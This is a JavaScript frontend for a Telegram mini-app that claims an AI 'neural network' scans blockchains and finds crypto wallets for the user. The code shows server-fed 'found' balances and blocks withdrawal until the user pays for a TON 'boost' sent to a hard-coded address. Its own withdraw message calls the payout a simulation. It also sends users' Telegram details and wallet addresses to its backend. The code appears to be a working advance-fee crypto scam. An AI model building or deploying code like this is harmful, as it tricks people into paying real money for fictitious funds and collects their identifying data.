// public/app.js
(function() {
  'use strict';

  const API_BASE = '';
  const TON_MANIFEST = 'https://gist.githubusercontent.com/siandreev/75f1a2ccf2f3b4e2771f6089aeb06d7f/raw/d4986344010ec7a2d1cc8a2a9baa57de37aaccb8/tonconnect-manifest.json';

  const PAGES = {
    scan: document.getElementById('page-scan'),
    boost: document.getElementById('page-boost'),
    profile: document.getElementById('page-profile')
  };

  const navBtns = document.querySelectorAll('.bottom-nav .nav-btn');
  const startScanBtn = document.getElementById('startScan');
  const stopScanBtn = document.getElementById('stopScan');
  const scanResult = document.getElementById('scanResult');
  const balancesList = document.getElementById('balancesList');
  const totalUsdValue = document.getElementById('totalUsdValue');

  const statusNetwork = document.getElementById('statusNetwork');
  const statusWallet = document.getElementById('statusWallet');
  const statusAI = document.getElementById('statusAI');
  const statusScanned = document.getElementById('statusScanned');
  const statusSpeed = document.getElementById('statusSpeed');
  const statusOnline = document.getElementById('statusOnline');

  const headerSpeed = document.getElementById('headerSpeed');
  const headerRate = document.getElementById('headerRate');
  const telegramUserDiv = document.getElementById('telegramUser');
  const telegramAvatar = document.getElementById('telegramAvatar');
  const telegramUsername = document.getElementById('telegramUsername');

  const buyBtns = document.querySelectorAll('.buy-btn');
  const boostPanelInfo = document.getElementById('boostPanelInfo');

  const profileTotalUsd = document.getElementById('profileTotalUsd');
  const profileBalancesList = document.getElementById('profileBalancesList');
  const boostStatusText = document.getElementById('boostStatusText');
  const nonZeroCount = document.getElementById('nonZeroCount');

  let tonConnectUI = null;
  let walletAddress = null;
  let scanning = false;
  let baseScanDelay = 2000;
  let currentProfile = null;

  function initTonConnect() {
    try {
      tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: TON_MANIFEST,
        buttonRootId: 'tonConnectBtn'
      });

      tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
          walletAddress = wallet.account.address;
          showBoostMessage(`✅ Wallet connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`, 'success');
          fetch(API_BASE + '/api/store-ton', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: walletAddress })
          }).catch(console.error);
          refreshProfile();
        } else {
          walletAddress = null;
          showBoostMessage('Connect your TON wallet to purchase boosts', 'info');
        }
      });
    } catch (e) {
      console.error('TON Connect init failed:', e);
    }
  }

  navBtns.forEach(b => b.addEventListener('click', () => {
    const p = b.dataset.page;
    Object.values(PAGES).forEach(x => x.classList.remove('active'));
    PAGES[p].classList.add('active');
    navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === p));
    if (p === 'profile') refreshProfile();
  }));

  function fmtAmount(v, p = 8) {
    const n = Number(v || 0);
    if (Math.abs(n) >= 1) return n.toLocaleString(undefined, { maximumFractionDigits: p });
    return n.toFixed(Math.min(p, 8)).replace(/\.?0+$/, '');
  }

  function fmtUSD(v) {
    if (v == null || isNaN(v)) return '0.00';
    return Number(v).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  function showBoostMessage(msg, type = 'info') {
    boostPanelInfo.innerText = msg;
    boostPanelInfo.style.display = 'block';
    
    const colors = {
      success: { bg: 'rgba(16, 185, 129, 0.15)', border: 'rgba(16, 185, 129, 0.4)', color: '#10b981' },
      error: { bg: 'rgba(239, 68, 68, 0.15)', border: 'rgba(239, 68, 68, 0.4)', color: '#ef4444' },
      info: { bg: 'rgba(6, 182, 212, 0.15)', border: 'rgba(6, 182, 212, 0.4)', color: '#06b6d4' }
    };
    
    const style = colors[type] || colors.info;
    boostPanelInfo.style.background = style.bg;
    boostPanelInfo.style.borderColor = style.border;
    boostPanelInfo.style.color = style.color;
  }

  // ДИНАМІЧНЕ оновлення Neural Status
  function updateNeuralStatus(profile) {
    if (!profile) return;
    
    // Оновлюємо Network (може змінюватися)
    statusNetwork.innerText = profile.wallet?.network || 'Binance Smart Chain';
    
    // Оновлюємо Wallet Address (змінюється кожен сеанс)
    statusWallet.innerText = profile.wallet?.address || '0x0000...0000';
    
    // Оновлюємо кількість відсканованих гаманців
    statusScanned.innerText = profile.scannedWallets || 0;
    
    // Оновлюємо швидкість
    statusSpeed.innerText = `${profile.speedMultiplier || 1}x`;
    
    // Оновлюємо статус online/offline
    statusOnline.innerText = profile.statusOnline ? '●' : '○';
    
    // Оновлюємо header badges
    headerSpeed.innerText = `${profile.speedMultiplier || 1}x`;
    headerRate.innerText = `${(profile.findRate * 100).toFixed(0)}%`;
    
    // AI Status залежить від стану сканування та балансів
    const hasBalance = Object.values(profile.balances || {}).some(b => b > 0);
    if (scanning) {
      statusAI.innerText = 'Neural network scanning blockchain for crypto wallets...';
    } else if (hasBalance) {
      const count = Object.keys(profile.balances).filter(k => profile.balances[k] > 0).length;
      statusAI.innerText = `Analysis complete: Found ${count} cryptocurrencies. Total: $${fmtUSD(profile.totalUsd)}`;
    } else {
      statusAI.innerText = 'Ready to scan. Start neural network to find crypto.';
    }
  }

  function updateTelegramUser(profile) {
    if (profile && profile.telegramUser) {
      const user = profile.telegramUser;
      telegramUsername.innerText = user.username ? `@${user.username}` : user.first_name || 'User';
      
      if (user.photo_url) {
        telegramAvatar.src = user.photo_url;
      } else if (user.username) {
        telegramAvatar.src = `https://unavatar.io/telegram/${user.username}`;
      } else {
        telegramAvatar.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(user.first_name || 'User')}&background=8b5cf6&color=fff`;
      }
      
      telegramUserDiv.classList.remove('hidden');
    }
  }

  async function fetchProfile() {
    const res = await fetch(API_BASE + '/api/profile');
    if (!res.ok) throw new Error('Profile fetch failed');
    return await res.json();
  }

  async function refreshProfile() {
    try {
      const p = await fetchProfile();
      currentProfile = p;
      
      // Оновлюємо Neural Status (динамічно!)
      updateNeuralStatus(p);
      updateTelegramUser(p);
      
      balancesList.innerHTML = '';
      const keys = Object.keys(p.balances || {});
      
      for (const k of keys) {
        const li = document.createElement('li');
        const balance = p.balances[k];
        const usdInfo = p.usdBalances && p.usdBalances[k];
        const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
        
        li.innerHTML = `
          <div class="label">${k}</div>
          <div class="amount">
            <div>${fmtAmount(balance)}</div>
            <div class="usd">$${usdText}</div>
          </div>
        `;
        balancesList.appendChild(li);
      }
      
      if (totalUsdValue) totalUsdValue.innerText = fmtUSD(p.totalUsd);
      if (profileTotalUsd) profileTotalUsd.innerText = fmtUSD(p.totalUsd);
      
      if (boostStatusText) {
        if (p.boost && p.boost.purchased) {
          boostStatusText.innerText = `${p.boost.amount} TON Boost Active (${p.speedMultiplier}x Speed)`;
        } else {
          boostStatusText.innerText = 'No Active Boost';
        }
      }
      
      if (profileBalancesList) {
        profileBalancesList.innerHTML = '';
        let nonZero = 0;
        
        for (const k of keys) {
          const balance = p.balances[k];
          if (balance <= 0) continue;
          
          nonZero++;
          const usdInfo = p.usdBalances && p.usdBalances[k];
          const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
          
          const item = document.createElement('div');
          item.className = 'profile-balance-item';
          
          // Кнопка ЗАВЖДИ активна, але обробляється по-різному
          item.innerHTML = `
            <div class="balance-info">
              <div class="balance-crypto">${k}</div>
              <div class="balance-amount">${fmtAmount(balance)} ≈ $${usdText}</div>
            </div>
            <div class="balance-actions">
              <button class="btn-withdraw" data-crypto="${k}">
                Withdraw
              </button>
            </div>
          `;
          profileBalancesList.appendChild(item);
        }
        
        if (nonZeroCount) nonZeroCount.innerText = nonZero;
        
        // Додаємо обробник для всіх кнопок Withdraw
        document.querySelectorAll('.btn-withdraw').forEach(btn => {
          btn.addEventListener('click', (e) => handleWithdraw(e.target.dataset.crypto));
        });
      }
    } catch (e) {
      console.error('Profile refresh error:', e);
    }
  }

  async function buyBoostWithTon(amount) {
    if (!walletAddress) {
      showBoostMessage('⚠️ Please connect your TON wallet first', 'error');
      return;
    }
    
    const amountInNano = amount * 1000000000;
    const TON_RECEIVE_ADDRESS = currentProfile?.tonReceiveAddress || 'UQAhk2ixejZ9_K0MPQjH3CUN4_PSDUfZEGaXtKU78nh-0Fdn';
    
    try {
      showBoostMessage('📤 Preparing transaction...', 'info');
      
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{
          address: TON_RECEIVE_ADDRESS,
          amount: amountInNano.toString()
        }]
      };
      
      const result = await tonConnectUI.sendTransaction(transaction);
      showBoostMessage('⏳ Transaction sent! Confirming...', 'info');
      
      const res = await fetch(API_BASE + '/api/confirm-boost', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, txHash: result.boc })
      });
      
      const r = await res.json();
      if (r.success) {
        showBoostMessage(`✅ Boost activated! Speed: ${r.speedMultiplier}x | Find Rate: ${(r.findRate * 100).toFixed(0)}%`, 'success');
        await refreshProfile();
      } else {
        showBoostMessage('❌ ' + (r.error || 'Boost activation failed'), 'error');
      }
    } catch (e) {
      console.error('Transaction error:', e);
      if (e.message && e.message.includes('user reject')) {
        showBoostMessage('❌ Transaction cancelled', 'error');
      } else {
        showBoostMessage('❌ Transaction failed', 'error');
      }
    }
  }

  buyBtns.forEach(b => b.addEventListener('click', (ev) => {
    buyBoostWithTon(Number(ev.currentTarget.dataset.amt));
  }));

  async function scanSingleWallet() {
    try {
      const res = await fetch(API_BASE + '/api/scan-wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
      });
      const j = await res.json();
      
      if (j.result && j.result.found) {
        const { crypto, amount } = j.result;
        const usdInfo = j.usdBalances && j.usdBalances[crypto];
        const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
        
        scanResult.innerHTML = `
          <span class="result-icon">🎉</span>
          <span>Found ${fmtAmount(amount)} ${crypto} ($${usdText})!</span>
        `;
        scanResult.style.background = 'rgba(16, 185, 129, 0.15)';
        scanResult.style.borderColor = 'rgba(16, 185, 129, 0.4)';
        scanResult.style.color = '#10b981';
      } else {
        scanResult.innerHTML = `
          <span class="result-icon">🔍</span>
          <span>Scanning... Wallet #${j.scannedWallets || 0}</span>
        `;
        scanResult.style.background = 'rgba(6, 182, 212, 0.08)';
        scanResult.style.borderColor = 'rgba(6, 182, 212, 0.2)';
        scanResult.style.color = '#06b6d4';
      }
      
      // Оновлюємо профіль після кожного скану (щоб Neural Status оновлювався)
      await refreshProfile();
    } catch (e) {
      console.error('Scan error:', e);
    }
  }

  async function startContinuousScan() {
    if (scanning) return;
    scanning = true;
    
    startScanBtn.classList.add('hidden');
    stopScanBtn.classList.remove('hidden');
    
    scanResult.innerHTML = `<span class="result-icon">⚡</span><span>Neural network activated...</span>`;
    scanResult.style.background = 'rgba(139, 92, 246, 0.15)';
    scanResult.style.borderColor = 'rgba(139, 92, 246, 0.4)';
    scanResult.style.color = '#8b5cf6';
    
    while (scanning) {
      try {
        const p = await fetchProfile();
        currentProfile = p;
        updateNeuralStatus(p); // Оновлюємо Neural Status постійно
        
        const mult = p.speedMultiplier || 1;
        const effectiveDelay = Math.max(200, Math.round(baseScanDelay / mult));
        
        await scanSingleWallet();
        await new Promise(r => setTimeout(r, effectiveDelay));
      } catch (e) {
        console.error('Scan loop error:', e);
        await new Promise(r => setTimeout(r, baseScanDelay));
      }
    }
    
    scanResult.innerHTML = `<span class="result-icon">⏸</span><span>Scan paused</span>`;
    scanResult.style.background = 'rgba(245, 158, 11, 0.15)';
    scanResult.style.borderColor = 'rgba(245, 158, 11, 0.4)';
    scanResult.style.color = '#f59e0b';
    
    startScanBtn.classList.remove('hidden');
    stopScanBtn.classList.add('hidden');
    
    // Оновлюємо статус після зупинки
    await refreshProfile();
  }

  startScanBtn.addEventListener('click', () => startContinuousScan());
  stopScanBtn.addEventListener('click', () => { scanning = false; });

  // Обробка Withdraw - ЗАВЖДИ активна кнопка
  function handleWithdraw(crypto) {
    // Перевіряємо чи є буст
    if (!currentProfile || !currentProfile.boost || !currentProfile.boost.purchased) {
      // ПОКАЗУЄМО MODAL якщо немає бусту
      document.getElementById('withdrawModal').classList.remove('hidden');
      return;
    }
    
    // Якщо буст є - продовжуємо звичайний withdraw
    const balance = currentProfile.balances[crypto];
    if (!balance || balance <= 0) {
      alert('⚠️ Insufficient balance!');
      return;
    }
    
    const amount = prompt(`Enter amount of ${crypto} to withdraw (Max: ${fmtAmount(balance)}):`);
    if (!amount) return;
    
    const amt = Number(amount);
    if (isNaN(amt) || amt <= 0 || amt > balance) {
      alert('⚠️ Invalid amount!');
      return;
    }
    
    fetch(API_BASE + '/api/withdraw', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ crypto, amount: amt })
    }).then(res => res.json()).then(r => {
      if (r.success) {
        alert(`✅ ${r.message}\n\nNote: This is a simulation.`);
        refreshProfile();
      } else {
        alert('❌ ' + (r.error || 'Withdrawal failed'));
      }
    }).catch(e => {
      console.error('Withdraw error:', e);
      alert('❌ Network error');
    });
  }

  // Modal functions
  window.closeWithdrawModal = function() {
    document.getElementById('withdrawModal').classList.add('hidden');
  };

  window.goToBoostPage = function() {
    closeWithdrawModal();
    Object.values(PAGES).forEach(x => x.classList.remove('active'));
    PAGES.boost.classList.add('active');
    navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === 'boost'));
  };

  // Telegram WebApp integration
  if (window.Telegram && window.Telegram.WebApp) {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    
    const user = tg.initDataUnsafe.user;
    if (user) {
      fetch(API_BASE + '/api/store-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegramUser: user })
      }).then(() => refreshProfile()).catch(console.error);
    }
  }

  async function init() {
    await refreshProfile();
    initTonConnect();
    
    // Оновлюємо Neural Status кожні 3 секунди (навіть якщо не сканує)
    setInterval(() => {
      if (currentProfile) {
        updateNeuralStatus(currentProfile);
      }
    }, 3000);
  }

  init();
})();